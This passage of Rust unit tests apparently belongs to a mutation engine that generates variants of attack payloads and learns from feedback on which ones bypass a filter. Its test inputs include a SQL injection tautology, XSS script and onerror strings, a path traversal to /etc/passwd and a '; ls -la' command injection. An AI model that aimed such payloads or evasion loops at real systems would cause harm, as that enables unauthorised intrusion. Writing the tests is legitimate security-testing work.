        let t1 = state.sql.temperature();
        mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 10, &mut state);
        let t2 = state.sql.temperature();
        assert!(
            t1 <= t0,
            "temperature must decrease after first call: t0={t0} t1={t1}"
        );
        assert!(
            t2 <= t1,
            "temperature must decrease after second call: t1={t1} t2={t2}"
        );
    }

    #[test]
    fn stateless_and_stateful_produce_same_type_contract() {
        // The stateless mutate_as and stateful mutate_as_with_state must
        // both honour max_mutations and produce the correct PayloadType.
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let stateless = mutate_as("' OR 1=1--", PayloadType::Sql, 15);
        let stateful = mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 15, &mut state);
        assert!(stateless.len() <= 15);
        assert!(stateful.len() <= 15);
        assert!(stateless.iter().all(|m| m.payload_type == PayloadType::Sql));
        assert!(stateful.iter().all(|m| m.payload_type == PayloadType::Sql));
    }

    #[test]
    fn feedback_non_cfg_rules_are_ignored() {
        // Rules without "cfg_" prefix must not cause panics or state corruption.
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        // These are non-CFG rules — feedback must silently skip them.
        feedback(&mut state, PayloadType::Sql, &["sql_tautology", "url_encode"], true);
        feedback(&mut state, PayloadType::Xss, &["xss_tag_combo"], false);
        // State must still work after no-op feedback.
        let variants = mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 5, &mut state);
        assert!(variants.len() <= 5);
    }

    #[test]
    fn cfg_mutator_state_default_is_same_as_new() {
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let s1 = CfgMutatorState::new();
        let s2 = CfgMutatorState::default();
        // Both must start at the same temperature.
        assert!(
            (s1.sql.temperature() - s2.sql.temperature()).abs() < f64::EPSILON,
            "CfgMutatorState::new() and ::default() must have identical initial state"
        );
    }

    // ── mutate_streaming: iterator API ────────────────────────────────────────

    #[test]
    fn mutate_streaming_sql_yields_correct_type() {
        let req = MutationRequest {
            max_count: 15,
            diversity: DiversityPolicy::Random,
            exclude: std::collections::HashSet::new(),
        };
        let results: Vec<GrammarMutation> =
            mutate_streaming("' OR 1=1--", PayloadType::Sql, &req).collect();
        assert!(!results.is_empty(), "mutate_streaming must yield results");
        assert!(results.len() <= 15, "must honour max_count: {}", results.len());
        assert!(
            results.iter().all(|m| m.payload_type == PayloadType::Sql),
            "all streaming SQL mutations must carry PayloadType::Sql"
        );
    }

    #[test]
    fn mutate_streaming_respects_max_count() {
        for max_count in [0, 1, 5, 20] {
            let req = MutationRequest {
                max_count,
                diversity: DiversityPolicy::Random,
                exclude: std::collections::HashSet::new(),
            };
            let results: Vec<_> =
                mutate_streaming("<script>alert(1)</script>", PayloadType::Xss, &req).collect();
            assert!(
                results.len() <= max_count,
                "max_count={max_count} but got {} results",
                results.len()
            );
        }
    }

    #[test]
    fn mutate_streaming_zero_count_yields_empty() {
        let req = MutationRequest {
            max_count: 0,
            diversity: DiversityPolicy::Random,
            exclude: std::collections::HashSet::new(),
        };
        let results: Vec<_> =
            mutate_streaming("' OR 1=1--", PayloadType::Sql, &req).collect();
        assert!(results.is_empty(), "zero max_count must yield empty iterator");
    }

    #[test]
    fn mutate_streaming_take_short_circuits() {
        // Iterator consumers like take() must compose correctly with streaming.
        let req = MutationRequest {
            max_count: 20,
            diversity: DiversityPolicy::Random,
            exclude: std::collections::HashSet::new(),
        };
        let results: Vec<_> =
            mutate_streaming("' OR 1=1--", PayloadType::Sql, &req)
                .take(3)
                .collect();
        assert!(results.len() <= 3);
    }

    #[test]
    fn mutate_streaming_coverage_guided_deduplicates() {
        let req = MutationRequest {
            max_count: 20,
            diversity: DiversityPolicy::CoverageGuided,
            exclude: std::collections::HashSet::new(),
        };
        let results: Vec<_> =
            mutate_streaming("' OR 1=1--", PayloadType::Sql, &req).collect();
        // All rules_applied combos must be unique (coverage-guided guarantee).
        let mut seen = std::collections::HashSet::new();
        for m in &results {
            seen.insert(m.rules_applied.join(","));
        }
        assert_eq!(
            seen.len(),
            results.len(),
            "coverage-guided streaming must not produce duplicate rule-sets"
        );
    }

    // ── DiversityPolicy::RuleTargeted: filtering ──────────────────────────────

    #[test]
    fn rule_targeted_filters_to_matching_rules() {
        // Only mutations that include at least one of the targeted rules must appear.
        static TARGET_RULES: &[&str] = &["cfg_convergence"];
        let req = MutationRequest {
            max_count: 30,
            diversity: DiversityPolicy::RuleTargeted(TARGET_RULES),
            exclude: std::collections::HashSet::new(),
        };
        let results = mutate_request("' OR 1=1--", PayloadType::Sql, &req);
        // If we get any results, each must contain at least one target rule.
        for m in &results {
            assert!(
                m.rules_applied.iter().any(|r| TARGET_RULES.contains(r)),
                "RuleTargeted mutation must contain a target rule, got {:?}",
                m.rules_applied
            );
        }
    }

    #[test]
    fn rule_targeted_empty_rules_slice_returns_empty() {
        // No rules to match against → no mutations pass the filter.
        static NO_RULES: &[&str] = &[];
        let req = MutationRequest {
            max_count: 20,
            diversity: DiversityPolicy::RuleTargeted(NO_RULES),
            exclude: std::collections::HashSet::new(),
        };
        let results = mutate_request("' OR 1=1--", PayloadType::Sql, &req);
        assert!(
            results.is_empty(),
            "RuleTargeted with empty rules must return no mutations"
        );
    }

    #[test]
    fn rule_targeted_non_matching_rule_returns_empty() {
        // A rule that no mutation will ever carry → empty output.
        static NONEXISTENT_RULES: &[&str] = &["rule_that_does_not_exist_ever"];
        let req = MutationRequest {
            max_count: 30,
            diversity: DiversityPolicy::RuleTargeted(NONEXISTENT_RULES),
            exclude: std::collections::HashSet::new(),
        };
        let results = mutate_request("' OR 1=1--", PayloadType::Sql, &req);
        assert!(
            results.is_empty(),
            "no mutations carry a non-existent rule; RuleTargeted must filter all out"
        );
    }

    // ── MutationRequest::default() values ─────────────────────────────────────

    #[test]
    fn mutation_request_default_values() {
        // Anti-rig: pin that the Default impl preserves the documented defaults.
        // If the defaults change, this test breaks and forces a conscious decision.
        let req = MutationRequest::default();
        assert_eq!(req.max_count, 10, "MutationRequest::default max_count must be 10");
        assert!(
            matches!(req.diversity, DiversityPolicy::Random),
            "MutationRequest::default diversity must be Random"
        );
        assert!(req.exclude.is_empty(), "MutationRequest::default exclude must be empty");
    }

    // ── mutate_as_with_state: non-CFG types fall back to stateless ────────────

    #[test]
    fn mutate_as_with_state_path_traversal_falls_back_stateless() {
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let variants = mutate_as_with_state(
            "../../../../etc/passwd",
            PayloadType::PathTraversal,
            10,
            &mut state,
        );
        // PathTraversal has no CFG state, falls back to stateless mutate_as.
        // Must still produce valid mutations typed correctly.
        assert!(variants.len() <= 10);
        assert!(
            variants.iter().all(|m| m.payload_type == PayloadType::PathTraversal),
            "PathTraversal stateful must still carry correct PayloadType"
        );
    }

    #[test]
    fn mutate_as_with_state_cmdi_falls_back_stateless() {
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let variants = mutate_as_with_state("; ls -la", PayloadType::CommandInjection, 10, &mut state);
        assert!(variants.len() <= 10);
        assert!(
            variants.iter().all(|m| m.payload_type == PayloadType::CommandInjection),
        );
    }

    // ── feedback: reward / penalize ───────────────────────────────────────────

    #[test]
    fn feedback_blocked_does_not_panic() {
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let variants = mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 20, &mut state);
        if let Some(v) = variants.iter().find(|m| m.rules_applied.contains(&"cfg_convergence")) {
            // Penalize (blocked = false bypass).
            feedback(&mut state, v.payload_type, &v.rules_applied, false);
        }
        // State must remain functional after penalizing.
        let follow_up = mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 5, &mut state);
        assert!(follow_up.len() <= 5);
    }

    #[test]
    fn feedback_xss_bypass_does_not_panic() {
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let variants =
            mutate_as_with_state("<script>alert(1)</script>", PayloadType::Xss, 20, &mut state);
        if let Some(v) = variants.iter().find(|m| m.rules_applied.contains(&"cfg_convergence")) {
            feedback(&mut state, v.payload_type, &v.rules_applied, true);
        }
        let follow_up =
            mutate_as_with_state("<img onerror=alert(1)>", PayloadType::Xss, 5, &mut state);
        assert!(follow_up.len() <= 5);
    }
}
